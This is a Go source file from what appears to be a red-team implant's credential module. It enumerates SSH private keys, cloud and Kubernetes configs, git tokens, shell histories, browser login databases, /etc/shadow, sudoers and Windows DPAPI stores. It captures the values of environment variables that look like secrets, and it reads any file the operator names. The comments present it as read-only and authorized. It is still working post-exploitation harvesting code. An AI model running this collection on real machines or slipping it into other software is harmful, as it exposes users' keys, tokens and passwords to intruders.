// Package credential performs read-only discovery of credential-bearing files
// and environment variables on an authorized target. It never writes, parses,
// or decrypts a secret; operators explicitly read a named file with
// credential_read (or download_chunk), and every task is gated by the
// engagement's credential capability.
package credential

import (
	"bufio"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strings"
)

// Source is one credential-bearing path the implant checked.
type Source struct {
	Category string `json:"category"` // ssh, cloud, shell, browser, system, vcs
	Path     string `json:"path"`
	Present  bool   `json:"present"`
	Readable bool   `json:"readable"`
	Mode     string `json:"mode,omitempty"`
	Size     int64  `json:"size,omitempty"`
	Note     string `json:"note,omitempty"`
}

// Finding is a discovered credential-adjacent value (for example an
// environment variable or an unencrypted SSH key).
type Finding struct {
	Kind  string `json:"kind"` // env, ssh_key, shadow, sudoers
	Name  string `json:"name"`
	Value string `json:"value,omitempty"`
	Note  string `json:"note,omitempty"`
}

// ErrDumpUnsupported is returned by Dump on non-Windows builds.
var ErrDumpUnsupported = errors.New("credential dumping requires Windows")

// DumpResult describes a dump written by the target. The operator retrieves it
// with the chunked download tasks.
type DumpResult struct {
	Kind   string `json:"kind"`
	Path   string `json:"path"`
	Size   int64  `json:"size"`
	SHA256 string `json:"sha256"`
	Note   string `json:"note,omitempty"`
}

// Report is the result of credential_enum.
type Report struct {
	User     string    `json:"user"`
	Home     string    `json:"home"`
	Sources  []Source  `json:"sources"`
	Findings []Finding `json:"findings"`
}

// candidate describes a path to inspect. Windows and Unix sets differ.
type candidate struct {
	category string
	path     string
}

// Enumerate inspects the credential sources under home and the supplied
// environment. It is intentionally read-only: files are opened only to test
// readability and, for SSH keys, to read the first line.
func Enumerate(username, home string, environ []string) Report {
	report := Report{
		User:     username,
		Home:     home,
		Sources:  make([]Source, 0, 24),
		Findings: make([]Finding, 0, 8),
	}

	for _, c := range candidates(home) {
		src := inspect(c.category, c.path)
		if src.Present && src.Readable && c.category == "ssh" && isPrivateKeyName(c.path) {
			if note := sshKeyNote(c.path); note != "" {
				src.Note = note
				if strings.HasPrefix(note, "unencrypted") {
					report.Findings = append(report.Findings, Finding{
						Kind: "ssh_key",
						Name: c.path,
						Note: note,
					})
				}
			}
		}
		report.Sources = append(report.Sources, src)
	}

	report.Findings = append(report.Findings, envFindings(environ)...)

	sort.Slice(report.Sources, func(i, j int) bool { return report.Sources[i].Path < report.Sources[j].Path })
	sort.Slice(report.Findings, func(i, j int) bool {
		if report.Findings[i].Kind != report.Findings[j].Kind {
			return report.Findings[i].Kind < report.Findings[j].Kind
		}
		return report.Findings[i].Name < report.Findings[j].Name
	})
	return report
}

func candidates(home string) []candidate {
	if home == "" {
		return []candidate{
			{"system", "/etc/shadow"},
			{"system", "/etc/sudoers"},
		}
	}
	join := func(parts ...string) string { return filepath.Join(append([]string{home}, parts...)...) }

	if runtime.GOOS == "windows" {
		return append(windowsCandidates(home), []candidate{
			{"ssh", join(".ssh", "id_rsa")},
			{"ssh", join(".ssh", "id_ed25519")},
			{"ssh", join(".ssh", "config")},
			{"cloud", join(".aws", "credentials")},
			{"cloud", join(".kube", "config")},
			{"cloud", join(".docker", "config.json")},
			{"vcs", join(".git-credentials")},
			{"vcs", join("_netrc")},
		}...)
	}

	return []candidate{
		{"ssh", join(".ssh", "id_rsa")},
		{"ssh", join(".ssh", "id_ecdsa")},
		{"ssh", join(".ssh", "id_ed25519")},
		{"ssh", join(".ssh", "id_dsa")},
		{"ssh", join(".ssh", "config")},
		{"ssh", join(".ssh", "known_hosts")},
		{"cloud", join(".aws", "credentials")},
		{"cloud", join(".aws", "config")},
		{"cloud", join(".config", "gcloud", "application_default_credentials.json")},
		{"cloud", join(".azure", "accessTokens.json")},
		{"cloud", join(".azure", "msal_token_cache.json")},
		{"cloud", join(".kube", "config")},
		{"cloud", join(".docker", "config.json")},
		{"vcs", join(".git-credentials")},
		{"vcs", join(".config", "gh", "hosts.yml")},
		{"vcs", join(".netrc")},
		{"shell", join(".bash_history")},
		{"shell", join(".zsh_history")},
		{"shell", join(".python_history")},
		{"browser", join(".mozilla", "firefox")},
		{"browser", join(".config", "google-chrome")},
		{"browser", join(".config", "chromium")},
		{"system", "/etc/shadow"},
		{"system", "/etc/sudoers"},
		{"system", "/etc/sudoers.d"},
	}
}

// windowsCandidates covers Credential Manager, DPAPI, and browser stores. The
// files are enumerated as paths only; decryption needs the owning user's
// DPAPI context and is deliberately not attempted here.
func windowsCandidates(home string) []candidate {
	appData := os.Getenv("APPDATA")
	localAppData := os.Getenv("LOCALAPPDATA")
	out := []candidate{
		{"system", filepath.Join(home, "AppData", "Roaming", "Microsoft", "Credentials")},
		{"system", filepath.Join(home, "AppData", "Local", "Microsoft", "Credentials")},
		{"system", filepath.Join(home, "AppData", "Roaming", "Microsoft", "Protect")},
		{"browser", filepath.Join(localAppData, "Google", "Chrome", "User Data", "Default", "Login Data")},
		{"browser", filepath.Join(localAppData, "Microsoft", "Edge", "User Data", "Default", "Login Data")},
		{"browser", filepath.Join(appData, "Mozilla", "Firefox", "Profiles")},
		{"browser", filepath.Join(appData, "Opera Software", "Opera Stable", "Login Data")},
	}
	return out
}

func inspect(category, path string) Source {
	src := Source{Category: category, Path: path}
	info, err := os.Stat(path)
	if err != nil {
		return src
	}
	src.Present = true
	src.Mode = info.Mode().String()
	src.Size = info.Size()
	if info.IsDir() {
		src.Readable = true
		src.Note = "directory"
		return src
	}
	f, err := os.Open(path)
	if err != nil {
		src.Note = "not readable: " + err.Error()
		return src
	}
	_ = f.Close()
	src.Readable = true
	return src
}

func isPrivateKeyName(path string) bool {
	base := strings.ToLower(filepath.Base(path))
	return strings.HasPrefix(base, "id_") && !strings.HasSuffix(base, ".pub")
}

var encryptedPEM = regexp.MustCompile(`(?i)ENCRYPTED`)

func sshKeyNote(path string) string {
	f, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer f.Close()

	reader := bufio.NewReader(io.LimitReader(f, 4096))
	first, _ := reader.ReadString('\n')
	switch {
	case strings.Contains(first, "BEGIN OPENSSH PRIVATE KEY"):
		return "OpenSSH private key (encryption state unknown)"
	case strings.Contains(first, "BEGIN RSA PRIVATE KEY"),
		strings.Contains(first, "BEGIN EC PRIVATE KEY"),
		strings.Contains(first, "BEGIN DSA PRIVATE KEY"),
		strings.Contains(first, "BEGIN PRIVATE KEY"):
		if encryptedPEM.MatchString(first) {
			return "encrypted PEM private key"
		}
		return "unencrypted PEM private key"
	default:
		return "not a recognized private key"
	}
}

var sensitiveEnv = regexp.MustCompile(`(?i)(pass(word|wd)?|secret|token|api[_-]?key|access[_-]?key|credential|auth)`)

// envNoise matches variable names that look sensitive but do not carry a
// secret value.
var envNoise = map[string]bool{
	"SSH_AUTH_SOCK":            true,
	"XAUTHORITY":               true,
	"DBUS_SESSION_BUS_ADDRESS": true,
	"GPG_AGENT_INFO":           true,
	"MAIL":                     true,
}

func envFindings(environ []string) []Finding {
	var out []Finding
	for _, kv := range environ {
		name, value, ok := strings.Cut(kv, "=")
		if !ok || name == "" || envNoise[name] {
			continue
		}
		if !sensitiveEnv.MatchString(name) {
			continue
		}
		out = append(out, Finding{
			Kind:  "env",
			Name:  name,
			Value: truncate(value, 512),
		})
	}
	return out
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "...(truncated)"
}

// ReadSecret reads one regular file named by the operator, up to maxBytes.
// Special files (devices, FIFOs, sockets) are refused so a read cannot block
// or touch kernel memory.
func ReadSecret(path string, maxBytes int64) ([]byte, error) {
	clean := strings.TrimSpace(path)
	if clean == "" {
		return nil, fmt.Errorf("a path is required")
	}
	info, err := os.Stat(clean)
	if err != nil {
		return nil, err
	}
	if !info.Mode().IsRegular() {
		return nil, fmt.Errorf("%s is not a regular file", clean)
	}
	if info.Size() > maxBytes {
		return nil, fmt.Errorf("%s is %d bytes, over the %d-byte limit; use download_chunk", clean, info.Size(), maxBytes)
	}
	return os.ReadFile(clean)
}
